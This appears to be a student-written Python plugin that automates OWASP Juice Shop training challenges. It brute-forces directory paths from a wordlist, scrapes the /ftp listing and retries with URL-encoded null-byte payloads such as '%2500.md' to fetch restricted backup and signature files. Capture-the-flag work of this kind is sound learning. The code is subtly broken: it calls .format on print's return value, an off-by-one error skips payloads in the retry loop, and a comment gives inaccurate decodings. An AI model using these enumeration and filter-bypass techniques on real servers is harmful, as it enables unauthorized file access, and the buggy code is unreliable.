# SOURCE FILE:    access_log.py
# PROGRAM:        JuiceShop automating attack application -- Plugin
# FUNCTIONS:      Solve EASTER EGG, FORGETTEN DEVELOPER Backup, MISPLACED SIGNATURE FILE Challenge
#                 Brute force scan the subnet to find the confidential files
#
# DATE:           Dec 6, 2022
# REVISIONS:      N/A
# PROGRAMMER:     Yoyo Wang
#
# NOTES
#--------------------------------------------------------------------------------------

import re
from plugins import attack as a
import json
import urllib
from urllib import parse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#--------------------------------------------------------------------------------------
#Class: access_file
#Inherit: Attack
#--------------------------------------------------------------------------------------
class access_file(a.attack_inter):

# --------------------------------------------------------------------------------------
# FUNCTION: __init__
# ARGUMENTS: N/A
# RETURNS: void
# Description: Initial class variables
# --------------------------------------------------------------------------------------
    def __init__(self):
        # REST session
        self.juice_session = a.requests.session()

    def generator(self):
        pass

#--------------------------------------------------------------------------------------
#FUNCTION subnet_scan
#ARGUMENTS: N/A
#RETURNS: len_dict -> { length of the subnet: domain name of the subnet}
#         E.g. {'11234': ftp, '300': api}
#Description: This function is used to scan the subnet using different payload in common.txt
#             Special cases are extracted according to the length of the response text.
#NOTES: scan the subnet is very slow, may take several minutes.
#--------------------------------------------------------------------------------------
    def subnet_scan(self):
        len_dict = {}
        f = open('plugins/common.txt', 'r')
        while True:
            line = f.readline()
            if line:
                payload = a.URL + '/' + line[:-1]
                response = self.juice_session.get(payload)
                if response.status_code == 200:
                    len_dict[str(len(json.dumps(response.text)))] = line[:-1]
            else:
                break
        return len_dict

#--------------------------------------------------------------------------------------
#FUNCTION parse_html
#ARGUMENTS: string -> response text
#           subnet -> subnet found by subnet scan
#           tag -> tag for the confidential file, e.g. easter
#RETURNS: href[0][0][:idx]  --> desired file name e.g. eastere.egg
#Description: This function is used to parse the response html to find the desired file name
#
#NOTES: None
#--------------------------------------------------------------------------------------
    def parse_html(self, string, subnet, tag):
        print(tag)
        pattern = '<a.*?href="({}/{}.+)".*?>(.*?)</a>'.format(subnet, tag)
        try:
            href = re.findall(pattern, string)
            print(href)
            idx = href[0][0].find('"')
            return href[0][0][:idx]
        except:
            print( '{} NOT find, please use other script').format(tag)

#--------------------------------------------------------------------------------------
#FUNCTION find_confidential
#ARGUMENTS: subnet -> subnet found by subnet scan
#           confidential_tag -> tag for the confidential file, e.g. easter
#RETURNS: N/A
#Description: This function is used to access the confidential files given the tag
#
#NOTES: None
#--------------------------------------------------------------------------------------

    def find_confidential(self,subnet, confidential_tag):
        response = self.juice_session.get(a.URL+'/'+str(subnet))
        sub_url = self.parse_html(response.text, subnet, confidential_tag)
        response = self.juice_session.get( a.URL + '/' + str(sub_url))
        #print(response.text) ## This is imporatant, because it reminds us of .md/.pdf
        attempting = ['%25%30%2e%6d%64', '%25%31%2e%6d%64', '%25%31%2e%70%64%66','%25%30%30%2e%70%64%66','%2500.md']
        # encoding of '0.md', '1.md','1.pdf','00.md','000.md' respectively in the above attemping list
        i = 0
        while response.status_code != 200:
            if i == len(attempting):
                break
            i += 1
            response = self.juice_session.get(a.URL + '/' + str(sub_url) + attempting[i])
        print(response.status_code)

#--------------------------------------------------------------------------------------
#FUNCTION run
#ARGUMENTS: N/A
#RETURNS: N/A
#Description: This is the main function for plugin to send REST requests.
#
#NOTES: This function needs interactions, you need to specify which file you want to access.
#--------------------------------------------------------------------------------------
    def run(self):
        subnet_list = [value for value in self.subnet_scan().values()]## using the subnet scan, we found 4 kinds of subnet, and we can open them manually, and in this case, we found that ftp is indeed useful.
        print(subnet_list)
        print('Now let us go through the ftp subnet to find the confidential file')
        print('Now you can choose to find the confidential files. Here are three options:')
        show_dict = {'1':'easter', '2':'package', '3':'suspicious'}
        print(show_dict)
        self.find_confidential(subnet='ftp',confidential_tag=show_dict[str(input())]) ## challenge" Easter's egg
        #self.find_confidential(subnet='ftp',confidential_tag='package') ## challenge FORGETTEN DEVELOPER Backup
        #self.find_confidential(subnet='ftp',confidential_tag='suspicious') ## challenge MISPLACED SIGNATURE FILE




